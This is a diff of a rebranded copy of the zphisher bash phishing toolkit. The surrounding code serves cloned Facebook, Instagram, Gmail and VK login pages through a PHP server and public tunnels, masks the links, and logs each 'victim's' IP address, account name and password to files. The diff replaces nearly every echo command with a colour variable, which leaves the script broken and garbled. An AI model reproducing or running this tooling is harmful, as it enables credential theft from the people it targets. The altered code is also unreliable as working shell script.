@@ -161,7 +161,7 @@ done
 
 check_update(){ 
 
-echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : " 
+${ORANGE} -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : " 
 
 relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest' 
 
@@ -173,11 +173,11 @@ tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_versio
 
 if [[ $new_version != $__version__ ]]; then 
 
-echo -ne "${ORANGE}update found\n"${WHITE} 
+${ORANGE} -ne "${ORANGE}update found\n"${WHITE} 
 
 sleep 2 
 
-echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..." 
+${ORANGE} -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..." 
 
 pushd "$HOME" > /dev/null 2>&1 
 
@@ -191,7 +191,7 @@ if [[ -e ".zphisher.tar.gz" ]]; then
 
 tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1 
 
-[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; } 
+[ $? -ne 0 ] && { ${ORANGE} -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; } 
 
 rm -f .zphisher.tar.gz 
 
@@ -199,13 +199,13 @@ popd > /dev/null 2>&1
 
 { sleep 3; clear; banner_small; } 
 
-echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE} 
+${ORANGE} -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE} 
 
 { reset_color ; exit 1; } 
 
 else 
 
-echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading." 
+${ORANGE} -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading." 
 
 { reset_color; exit 1; } 
 
@@ -213,7 +213,7 @@ fi
 
 else 
 
-echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5 
+${ORANGE} -ne "${GREEN}up to date\n${WHITE}" ; sleep .5 
 
 fi 
 
@@ -225,59 +225,67 @@ fi
 
 check_status() { 
 
-echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : " 
+${ORANGE} -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : " 
 
 timeout 3s curl -fIs "https://api.github.com" > /dev/null 
 
-[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}" 
+[ $? -eq 0 ] && ${ORANGE} -e "${GREEN}Online${WHITE}" && check_update || ${ORANGE} -e "${RED}Offline${WHITE}" 
 {
 ## Banner
 banner() {
 	cat <<- EOF
 
-echo -e "\e[1;92m "
-echo "   ⊢□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■■□■□■□■□■□■□■□■□■⊣"
-echo -e "\e[1;92m"
-echo    " 
+${ORANGE} -e "\e[1;92m "
+${ORANGE} "   ⊢□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■■□■□■□■□■□■□■□■□■⊣"
+${ORANGE} -e "\e[1;92m"
+${ORANGE}    " 
 ███╗░░░███╗██████╗░░░░██╗░░██╗
 ████╗░████║██╔══██╗░░░╚██╗██╔╝
 ██╔████╔██║██████╔╝░░░░╚███╔╝░
 ██║╚██╔╝██║██╔══██╗░░░░██╔██╗░
 ██║░╚═╝░██║██║░░██║██╗██╔╝╚██╗
 ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝"
-echo "                                                                                        "
-echo "   ░██╗░░░░░██╗ ██╗░░██╗██╗████████╗███████╗  ██████╗░███████╗██╗░░░██╗██╗██╗░░░░░      "
-echo "   ░██║░██╗░██║ ██║░░██║██║╚══██╔══╝██╔════╝  ██╔══██╗██╔════╝██║░░░██║██║██║░░░░░      "
-echo "  ░╚██╗████╗██╔╝███████║██║░░░██║░░░█████╗░░  ██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░      "
-echo "  ░░████╔═████║░██╔══██║██║░░░██║░░░██╔══╝░░  ██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░     " 
-echo "  ░░████╔═████║░██╔══██║██║░░░██║░░░██╔══╝░░  ██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░     " 
-echo "  ░░╚██╔╝░╚██╔╝░██║░░██║██║░░░██║░░░███████╗  ██████╔╝███████╗░░╚██╔╝░░██║███████╗     " 
-echo "  ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚══════╝  ╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝      "
-echo "                                                                                         "
-echo "  ██████╗░██╗░██████╗██╗░░██╗░█████╗░██╗░░░░░ "
-echo "  ██╔══██╗██║██╔════╝██║░░██║██╔══██╗██║░░░░░ "
-echo "  ██████╦╝██║╚█████╗░███████║███████║██║░░░░░  "
-echo "  ██╔══██╗██║░╚═══██╗██╔══██║██╔══██║██║░░░░░ "
-echo "  ██████╦╝██║██████╔╝██║░░██║██║░░██║███████╗ "
-echo "  ╚═════╝░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝ "
-echo "       🅆🄷🄸🅃🄴 🄳🄴🅅🄸🄻    🄱🄸🅂🄷🄰🄻                                                   "
+${ORANGE} "                                                                                        "
+${ORANGE} "   ░██╗░░░░░██╗ ██╗░░██╗██╗████████╗███████╗  ██████╗░███████╗██╗░░░██╗██╗██╗░░░░░      "
+${ORANGE} "   ░██║░██╗░██║ ██║░░██║██║╚══██╔══╝██╔════╝  ██╔══██╗██╔════╝██║░░░██║██║██║░░░░░      "
+${ORANGE} "  ░╚██╗████╗██╔╝███████║██║░░░██║░░░█████╗░░  ██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░      "
+${ORANGE} "  ░░████╔═████║░██╔══██║██║░░░██║░░░██╔══╝░░  ██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░     " 
+${ORANGE} "  ░░████╔═████║░██╔══██║██║░░░██║░░░██╔══╝░░  ██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░     " 
+${ORANGE} "  ░░╚██╔╝░╚██╔╝░██║░░██║██║░░░██║░░░███████╗  ██████╔╝███████╗░░╚██╔╝░░██║███████╗     " 
+${ORANGE} "  ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░░╚═╝░░░╚══════╝  ╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝      "
+${ORANGE} "                                                                                         "
+${ORANGE} "  ██████╗░██╗░██████╗██╗░░██╗░█████╗░██╗░░░░░ "
+${ORANGE} "  ██╔══██╗██║██╔════╝██║░░██║██╔══██╗██║░░░░░ "
+${ORANGE} "  ██████╦╝██║╚█████╗░███████║███████║██║░░░░░  "
+${ORANGE} "  ██╔══██╗██║░╚═══██╗██╔══██║██╔══██║██║░░░░░ "
+${ORANGE} "  ██████╦╝██║██████╔╝██║░░██║██║░░██║███████╗ "
+${ORANGE} "  ╚═════╝░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝ "
+${ORANGE} "       🅆🄷🄸🅃🄴 🄳🄴🅅🄸🄻    🄱🄸🅂🄷🄰🄻                                              "    ${RED}Version : ${__version__}
 
-echo -e "\e[1;92m"
-echo "   ⊢□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■■□■□■□■□■□■□■□■□■□■⊣"
+${ORANGE} -e "\e[1;92m"
+${ORANGE} "   ⊢□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■□■■□■□■□■□■□■□■□■□■□■⊣"
 
 ${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Bishal Lamichhane ${WHITE} 
 
 EOF 
 
 } 
-
+## Small Banner
+banner_small() {
+	cat <<- EOF
+		${BLUE}
+		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
+		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
+		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+	EOF
+}
  
 
 ## Dependencies 
 
 dependencies() { 
 
-echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..." 
+${ORANGE} -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..." 
 
  
 
@@ -285,7 +293,7 @@ if [[ -d "/data/data/com.termux/files/home" ]]; then
 
 if [[ ! $(command -v proot) ]]; then 
 
-echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE} 
+${ORANGE} -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE} 
 
 pkg install proot resolv-conf -y 
 
@@ -295,7 +303,7 @@ fi
 
 if [[ ! $(command -v tput) ]]; then 
 
-echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE} 
+${ORANGE} -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE} 
 
 pkg install ncurses-utils -y 
 
@@ -307,7 +315,7 @@ fi
 
 if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then 
 
-echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed." 
+${ORANGE} -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed." 
 
 else 
 
@@ -317,7 +325,7 @@ for pkg in "${pkgs[@]}"; do
 
 type -p "$pkg" &>/dev/null || { 
 
-echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE} 
+${ORANGE} -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE} 
 
 if [[ $(command -v pkg) ]]; then 
 
@@ -345,7 +353,7 @@ sudo yum -y install "$pkg"
 
 else 
 
-echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually." 
+${ORANGE} -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually." 
 
 { reset_color; exit 1; } 
 
@@ -409,7 +417,7 @@ rm -rf "$file"
 
 else 
 
-echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}." 
+${ORANGE} -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}." 
 
 { reset_color; exit 1; } 
 
@@ -425,11 +433,11 @@ install_cloudflared() {
 
 if [[ -e ".server/cloudflared" ]]; then 
 
-echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed." 
+${ORANGE} -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed." 
 
 else 
 
-echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE} 
+${ORANGE} -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE} 
 
 arch=`uname -m` 
 
@@ -463,11 +471,11 @@ install_localxpose() {
 
 if [[ -e ".server/loclx" ]]; then 
 
-echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed." 
+${ORANGE} -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed." 
 
 else 
 
-echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE} 
+${ORANGE} -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE} 
 
 arch=`uname -m` 
 
@@ -499,9 +507,9 @@ fi
 
 msg_exit() { 
 
-{ clear; banner; echo; } 
+{ clear; banner; ${ORANGE}; } 
 
-echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n" 
+${ORANGE} -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n" 
 
 { reset_color; exit 0; } 
 
@@ -513,7 +521,7 @@ echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RES
 
 about() { 
 
-{ clear; banner; echo; } 
+{ clear; banner; ${ORANGE}; } 
 
 cat <<- EOF 
 
@@ -557,13 +565,13 @@ msg_exit;;
 
 0 | 00) 
 
-echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..." 
+${ORANGE} -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..." 
 
 { sleep 1; main_menu; };; 
 
 *) 
 
-echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
+${ORANGE} -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
 
 { sleep 1; about; };; 
 
@@ -577,13 +585,13 @@ esac
 
 cusport() { 
 
-echo 
+${ORANGE} 
 
 read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS 
 
 if [[ ${P_ANS} =~ ^([yY])$ ]]; then 
 
-echo -e "\n" 
+${ORANGE} -e "\n" 
 
 read -n4 -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter Your Custom 4-digit Port [1024-9999] : ${WHITE}" CU_P 
 
@@ -591,11 +599,11 @@ if [[ ! -z  ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024
 
 PORT=${CU_P} 
 
-echo 
+${ORANGE} 
 
 else 
 
-echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}" 
+${ORANGE} -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}" 
 
 { sleep 2; clear; banner_small; cusport; } 
 
@@ -603,7 +611,7 @@ fi
 
 else  
 
-echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n" 
+${ORANGE} -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n" 
 
 fi 
 
@@ -615,13 +623,13 @@ fi
 
 setup_site() { 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE} 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE} 
 
 cp -rf .sites/"$website"/* .server/www 
 
 cp -f .sites/ip.php .server/www/ 
 
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE} 
+${ORANGE} -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE} 
 
 cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 
@@ -637,9 +645,9 @@ IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 
 IFS=$'\n' 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP" 
 
-echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt" 
+${ORANGE} -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt" 
 
 cat .server/www/ip.txt >> auth/ip.txt 
 
@@ -657,15 +665,15 @@ PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF
 
 IFS=$'\n' 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT" 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD" 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat" 
 
 cat .server/www/usernames.txt >> auth/usernames.dat 
 
-echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. " 
+${ORANGE} -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. " 
 
 } 
 
@@ -675,13 +683,13 @@ echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE
 
 capture_data() { 
 
-echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..." 
+${ORANGE} -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..." 
 
 while true; do 
 
 if [[ -e ".server/www/ip.txt" ]]; then 
 
-echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !" 
+${ORANGE} -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !" 
 
 capture_ip 
 
@@ -693,7 +701,7 @@ sleep 0.75
 
 if [[ -e ".server/www/usernames.txt" ]]; then 
 
-echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!" 
+${ORANGE} -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!" 
 
 capture_creds 
 
@@ -717,11 +725,11 @@ rm .cld.log > /dev/null 2>&1 &
 
 cusport 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})" 
 
 { sleep 1; setup_site; } 
 
-echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..." 
+${ORANGE} -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..." 
 
  
 
@@ -761,7 +769,7 @@ sleep 1
 
 [ "$(./.server/loclx account status | grep Error)" ] && { 
 
-echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n" 
+${ORANGE} -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n" 
 
 sleep 3 
 
@@ -769,11 +777,11 @@ read -p "${RED}[${WHITE}-${RED}]${ORANGE} Input Loclx Token :${ORANGE} " loclx_t
 
 [[ $loclx_token == "" ]] && { 
 
-echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu 
+${ORANGE} -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu 
 
 } || { 
 
-echo -n "$loclx_token" > $auth_f 2> /dev/null 
+${ORANGE} -n "$loclx_token" > $auth_f 2> /dev/null 
 
 } 
 
@@ -789,17 +797,17 @@ start_loclx() {
 
 cusport 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})" 
 
 { sleep 1; setup_site; localxpose_auth; } 
 
-echo -e "\n" 
+${ORANGE} -e "\n" 
 
 read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion 
 
 [[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us" 
 
-echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..." 
+${ORANGE} -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..." 
 
  
 
@@ -833,13 +841,13 @@ start_localhost() {
 
 cusport 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})" 
 
 setup_site 
 
 { sleep 1; clear; banner_small; } 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}" 
 
 capture_data 
 
@@ -889,7 +897,7 @@ start_loclx;;
 
 *) 
 
-echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
+${ORANGE} -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
 
 { sleep 1; tunnel_menu; };; 
 
@@ -903,15 +911,15 @@ esac
 
 custom_mask() { 
 
-{ sleep .5; clear; banner_small; echo; } 
+{ sleep .5; clear; banner_small; ${ORANGE}; } 
 
 read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do you want to change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op 
 
-echo 
+${ORANGE} 
 
 if [[ ${mask_op,,} == "y" ]]; then 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n" 
 
 read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+ 
 
@@ -919,11 +927,11 @@ if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [
 
 mask=$mask_url 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask" 
 
 else 
 
-echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.." 
+${ORANGE} -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid url type..Using the Default one.." 
 
 fi 
 
@@ -945,11 +953,11 @@ short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-de
 
 if [[ "$1" == *"shrtco.de"* ]]; then 
 
-processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}') 
+processed_url=$(${ORANGE} ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}') 
 
 else 
 
-# processed_url=$(echo "$short" | awk -F// '{print $NF}') 
+# processed_url=$(${ORANGE} "$short" | awk -F// '{print $NF}') 
 
 processed_url=${short#http*//} 
 
@@ -999,7 +1007,7 @@ processed_url="https://$processed_url"
 
 else 
 
-# echo "[!] No url provided / Regex Not Matched" 
+# ${ORANGE} "[!] No url provided / Regex Not Matched" 
 
 url="Unable to generate links. Try after turning on hotspot" 
 
@@ -1009,11 +1017,11 @@ fi
 
  
 
-echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url" 
 
-echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url" 
+${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url" 
 
-[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url" 
+[[ $processed_url != *"Unable"* ]] && ${ORANGE} -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url" 
 
 } 
 
@@ -1081,7 +1089,7 @@ tunnel_menu;;
 
 *) 
 
-echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
+${ORANGE} -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
 
 { sleep 1; clear; banner_small; site_facebook; };; 
 
@@ -1153,7 +1161,7 @@ tunnel_menu;;
 
 *) 
 
-echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
+${ORANGE} -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
 
 { sleep 1; clear; banner_small; site_instagram; };; 
 
@@ -1215,7 +1223,7 @@ tunnel_menu;;
 
 *) 
 
-echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
+${ORANGE} -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
 
 { sleep 1; clear; banner_small; site_gmail; };; 
 
@@ -1267,7 +1275,7 @@ tunnel_menu;;
 
 *) 
 
-echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
+${ORANGE} -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
 
 { sleep 1; clear; banner_small; site_vk; };; 
 
@@ -1281,7 +1289,7 @@ esac
 
 main_menu() { 
 
-{ clear; banner; echo; } 
+{ clear; banner; ${ORANGE}; } 
 
 cat <<- EOF 
 
@@ -1603,7 +1611,7 @@ msg_exit;;
 
 *) 
 
-echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
+${ORANGE} -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..." 
 
 { sleep 1; main_menu; };; 
 
